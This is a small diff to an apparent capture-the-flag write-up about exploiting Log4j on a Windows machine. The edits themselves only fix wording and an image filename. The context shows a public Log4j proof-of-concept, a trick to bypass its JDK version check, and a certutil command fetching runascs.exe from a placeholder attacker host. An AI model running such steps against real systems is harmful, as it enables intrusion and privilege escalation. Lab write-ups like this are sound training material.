@@ -52,7 +52,7 @@ The website hosted on Windows IIS cannot be exploited in any way, so the Challen
 
 It is required to install the following tools to establish foothold:
 
-* Download the following [Log4j PoC](https://github.com/kozmer/log4j-shell-poc/tree/main?tab=readme-ov-file) by Kozmer from GitHub.
+* Download [Log4j PoC](https://github.com/kozmer/log4j-shell-poc/tree/main?tab=readme-ov-file) by Kozmer from GitHub.
 
 * The exploit requires **jdk-8u20** and checks if its present in the directory. Downloading the exact version from Oracle website prompts for account creation. I was able to find a slightly different jdk version - [jdk-8u202](https://mirrors.huaweicloud.com/java/jdk/8u202-b08/jdk-8u202-linux-x64.tar.gz) that works with the exploit. Once downloaded and extracted in the same directory as the POC script, rename the jdk directory to **jdk1.8.0_20** in order to bypass the script check.
 
@@ -158,7 +158,7 @@ certutil.exe -urlcache -split -f "http://<IP>:<PORT>/runascs.exe" runascs.exe
 ```
 
 <figure class="align-center">
-  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/crafty/rundadownload.png" alt="">
+  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/crafty/runadownload.png" alt="">
   <figcaption>Example of successfull download.</figcaption>
 </figure>
 
